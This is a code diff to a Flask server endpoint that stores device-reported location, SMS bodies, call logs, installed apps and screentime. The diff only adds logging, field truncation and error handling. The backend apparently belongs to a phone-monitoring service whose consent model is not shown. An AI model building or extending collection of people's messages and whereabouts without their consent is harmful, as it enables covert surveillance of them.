@@ -412,6 +412,17 @@ def report_bulk():
     if device:
         device.last_seen = _now_ms()
 
+    # Diagnostic: log payload shape before processing
+    try:
+        _payload_keys = sorted(data.keys()) if isinstance(data, dict) else []
+        current_app.logger.warning("report_bulk device=%s keys=%s sms_len=%s calls_len=%s apps_len=%s",
+                                    canonical, _payload_keys,
+                                    len(data.get('sms') or []),
+                                    len(data.get('calls') or []),
+                                    len(data.get('apps') or []))
+    except Exception as _e:
+        current_app.logger.exception("report_bulk payload-shape log failed: %s", _e)
+
     if 'location' in data:
         loc = data['location']
         db.session.add(LocationReport(
@@ -441,37 +452,81 @@ def report_bulk():
             ))
 
     if 'sms' in data:
+        skipped = 0
         for msg in data['sms']:
-            if not SmsMessage.query.filter_by(device_id=canonical, sms_id=msg.get('id')).first():
-                db.session.add(SmsMessage(
-                    device_id=canonical, sms_id=msg.get('id'),
-                    address=msg.get('address', ''), body=msg.get('body', ''),
-                    date=msg.get('date', 0), type=msg.get('type', 0),
-                ))
+            try:
+                sms_pk = msg.get('id')
+                if sms_pk is None:
+                    skipped += 1
+                    continue
+                if not SmsMessage.query.filter_by(device_id=canonical, sms_id=sms_pk).first():
+                    db.session.add(SmsMessage(
+                        device_id=canonical, sms_id=sms_pk,
+                        address=(msg.get('address') or '')[:100], body=msg.get('body', '') or '',
+                        date=msg.get('date', 0) or 0, type=msg.get('type', 0) or 0,
+                    ))
+            except Exception as e:
+                skipped += 1
+                current_app.logger.warning("report_bulk sms skip: %s id=%s", e, msg.get('id'))
+        if skipped:
+            current_app.logger.warning("report_bulk skipped %d sms entries", skipped)
 
     if 'calls' in data:
+        skipped = 0
         for call in data['calls']:
-            if not CallLog.query.filter_by(device_id=canonical, call_id=call.get('id')).first():
-                db.session.add(CallLog(
-                    device_id=canonical, call_id=call.get('id'),
-                    number=call.get('number', ''), name=call.get('name', ''),
-                    duration=call.get('duration', 0), date=call.get('date', 0),
-                    type=call.get('type', 0),
-                ))
+            try:
+                call_pk = call.get('id')
+                if call_pk is None:
+                    skipped += 1
+                    continue
+                if not CallLog.query.filter_by(device_id=canonical, call_id=call_pk).first():
+                    db.session.add(CallLog(
+                        device_id=canonical, call_id=call_pk,
+                        number=(call.get('number') or '')[:50],
+                        name=(call.get('name') or '')[:200],
+                        duration=call.get('duration', 0) or 0,
+                        date=call.get('date', 0) or 0,
+                        type=call.get('type', 0) or 0,
+                    ))
+            except Exception as e:
+                skipped += 1
+                current_app.logger.warning("report_bulk call skip: %s id=%s", e, call.get('id'))
+        if skipped:
+            current_app.logger.warning("report_bulk skipped %d call entries", skipped)
 
     if 'apps' in data and data['apps']:
-        InstalledApp.query.filter_by(device_id=canonical).delete()
+        try:
+            InstalledApp.query.filter_by(device_id=canonical).delete()
+        except Exception as e:
+            current_app.logger.exception("report_bulk apps delete failed: %s", e)
+            db.session.rollback()
+            return jsonify({
+                'error': 'Internal server error',
+                'detail': f'apps delete: {type(e).__name__}: {str(e)[:200]}',
+            }), 500
+        bad_apps = []
         for app_data in data['apps']:
-            db.session.add(InstalledApp(
-                device_id=canonical,
-                package_name=app_data.get('packageName') or app_data.get('package_name', ''),
-                app_name=app_data.get('appName') or app_data.get('app_name', ''),
-                version_name=app_data.get('versionName') or app_data.get('version_name', ''),
-                version_code=app_data.get('versionCode') or app_data.get('version_code', 0),
-                first_install_time=app_data.get('firstInstallTime') or app_data.get('first_install_time', 0),
-                last_update_time=app_data.get('lastUpdateTime') or app_data.get('last_update_time', 0),
-                is_system_app=app_data.get('isSystemApp') or app_data.get('is_system_app', False),
-            ))
+            try:
+                # Defensive truncation: app_name and package_name have column limits
+                pn = (app_data.get('packageName') or app_data.get('package_name') or '')[:255]
+                an = (app_data.get('appName') or app_data.get('app_name') or '')[:255]
+                vn = (app_data.get('versionName') or app_data.get('version_name') or '')[:50]
+                db.session.add(InstalledApp(
+                    device_id=canonical,
+                    package_name=pn,
+                    app_name=an,
+                    version_name=vn,
+                    version_code=app_data.get('versionCode') or app_data.get('version_code', 0),
+                    first_install_time=app_data.get('firstInstallTime') or app_data.get('first_install_time', 0),
+                    last_update_time=app_data.get('lastUpdateTime') or app_data.get('last_update_time', 0),
+                    is_system_app=app_data.get('isSystemApp') or app_data.get('is_system_app', False),
+                ))
+            except Exception as e:
+                bad_apps.append({'name': app_data.get('packageName') or app_data.get('package_name', ''),
+                                  'app': (app_data.get('appName') or '')[:60],
+                                  'err': f'{type(e).__name__}: {str(e)[:120]}'})
+        if bad_apps:
+            current_app.logger.warning("report_bulk skipped %d bad apps: %s", len(bad_apps), bad_apps[:3])
 
     if 'screentime' in data:
         st = data['screentime']
